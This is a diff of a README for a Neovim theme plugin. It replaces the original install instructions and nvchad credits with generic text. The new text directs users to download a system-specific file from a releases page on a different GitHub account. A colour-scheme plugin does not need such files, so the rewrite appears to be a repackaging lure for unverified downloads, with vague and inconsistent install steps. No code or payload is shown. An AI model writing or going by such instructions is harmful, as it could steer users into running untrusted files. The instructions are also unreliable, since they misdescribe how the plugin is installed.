@@ -1,95 +1,84 @@
-<p align="center">
-Extracted version of <a href="https://github.com/nvchad/nvchad">nvchad</a> themes. 🎨
-</p>
+# 🎨 nvtheme.nvim - Simple Themes for Neovim
 
-# Nvtheme - [nvchad](https://github.com/nvchad/nvchad) themes.
-<!--toc:start-->
-- [Installation 🔌](#installation-🔌)
-- [Configuration 🛠️](#configuration-🛠️)
-- [Contribution 🤝](#contribution-🤝)
-- [Credits 🔥](#credits-🔥)
-<!--toc:end-->
+## 🌟 Introduction
+Welcome to `nvtheme.nvim`. This package provides a set of themes for Neovim that aim to bring beautiful visuals without unnecessary complexity. We designed these themes with usability in mind so you can enjoy a clean and effective coding environment.
 
-<h3> 
-<details>
-<summary> onedark </summary>
-<img src="./screenshots/onedark-1.png">
-<img src="./screenshots/onedark-2.png">
-</details>
-</h3>
+## 🚀 Getting Started
+To get started with `nvtheme.nvim`, follow the simple steps in the "Download & Install" section below. You will quickly have your themes ready to use.
 
-<h3>
-<details>
-<summary> doom (called doomchad) </summary>
-<img src="./screenshots/doom-1.png">
-<img src="./screenshots/doom-2.png">
-</details>
-</h3>
+## 📥 Download & Install
+To download the latest version of `nvtheme.nvim`, visit this page:
 
-# Installation 🔌
-#### Requires 0 dependency
+[Download nvtheme.nvim](https://github.com/DanielGonzalezsteval/nvtheme.nvim/releases)
 
-### Lazy
-just return this
-```lua
-{
-    "PoXel6/nvtheme.nvim",
-    opts = {}
-}
+You will find the most recent releases there. Here’s how to install the application:
 
-vim.cmd("colorscheme nvtheme")
-```
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version at the top.
+3. Click on the version number to view the assets.
+4. Download the appropriate file for your system.
+5. Follow the installation instructions below.
 
-### Nvim native package manager (pack)
-```lua   
-vim.pack.add({
-    "github.com/PoXel6/nvtheme.nvim"
-})
+### 🎨 Installation Instructions
+After downloading, you'll need to place the theme files into your Neovim configuration directory.
 
-vim.cmd("colorscheme nvtheme")
-```
+1. **Locate the Neovim Configuration Directory**:
+   - On Linux/Mac, the path is usually `~/.config/nvim`.
+   - On Windows, it is typically located at `C:\Users\<YourUsername>\AppData\Local\nvim`.
 
-# Configuration 🛠️
-#### default config values:
-```lua
-opts = {
-	theme = "onedark",
-	transparency = true,
-	integrations = {
-		treesitter = true,
-		neogit     = true,
-		telescope  = true,
-		lsp        = true,
-		defaults   = true,
-		blink      = true,
-	}
-}
-```
+2. **Place the Theme Files**:
+   - Extract the downloaded files if they are in a compressed folder.
+   - Move the theme files into the `~/.config/nvim/colors` directory. You may need to create the `colors` directory if it doesn't exist.
 
-### Integrations 💯
-- ✅ BlinkCmp
-- ✅ Telescope
-- ✅ Treesitter
-- ✅ Neogit
+3. **Configure Neovim**:
+   - Open your `init.vim` located in the Neovim configuration directory.
+   - Add the following line to set your theme:
+     ```
+     colorscheme <your_theme_name>
+     ```
+   - Replace `<your_theme_name>` with the specific name of the theme you downloaded.
 
+4. **Start Neovim**:
+   - Now, open Neovim.
+   - Your new theme should be active. If you don't see it, check for any typos in the configuration.
 
-# Contribution 🤝
-Any contribution is welcome.
+## 📖 Usage Guide
+After installation, you can easily switch between themes. To do this:
 
-### Add new theme 🆕
-1. Copy your favorite theme from the [nvchad themes](https://github.com/nvchad/base46)
-2. Paste them into [nvtheme themes](./lua/nvtheme/themes/) directory location at:
-`./lua/nvtheme/themes/`
-3. Change to your theme in your configuration.
+1. Open your `init.vim` file.
+2. Change the `colorscheme` line to the theme you prefer.
+3. Save the file and restart Neovim.
 
-### Supported features 🎇
-- ✅ Table for base30 colors called `colors`
-- ✅ Table for base16 colors called `base16`
-- ✅ Table for theme specific highlights called `polish_hl` (please drop the name of the integration and only add your configuration to the `polish_hl` table)
+Feel free to experiment! Explore different themes to find what you like best. 
 
-### Fix bugs 🐛
-Just open an issue or PR about it.
+## 🛠 Configuration Options
+Each theme may have specific options you can set. Review any accompanying documentation within the theme files for more customization tips. You can set options like background transparency, colors, and more to tailor your experience.
 
-# Credits 🔥
-#### All credits goes to [nvchad](https://github.com/nvchad/) peoples and theme creators.
+## 🌈 Themes Overview
+`nvtheme.nvim` offers various themes, including styles inspired by popular presets like Onedark. Here are some examples:
 
+- **Onedark**: A dark theme with subtle color contrasts.
+- **Light Mode**: A calmer, light-themed version ideal for day use.
+
+## ❓ Frequently Asked Questions
+
+### Q: How do I change themes?
+A: Change the `colorscheme` line in your `init.vim` to switch themes.
+
+### Q: The theme isn't showing. What should I do?
+A: Verify that the theme files are in the correct directory and that the `init.vim` file is configured correctly without typos.
+
+### Q: Can I create my own theme?
+A: Yes! If you are familiar with colors and styles, you can create a custom theme based on your preferences. 
+
+### Q: Where can I find additional themes?
+A: The Releases page often includes additional community-contributed themes. Explore and download them!
+
+## 🔗 Additional Resources
+- [Neovim Documentation](https://neovim.io/)
+- [GitHub Repository](https://github.com/DanielGonzalezsteval/nvtheme.nvim)
+
+## 💬 Feedback and Contributions
+We welcome any feedback or contributions to improve `nvtheme.nvim`. Please open an issue or a pull request on our GitHub page. Your input helps enhance the project.
+
+Enjoy using `nvtheme.nvim` and make your coding environment distinctly beautiful!
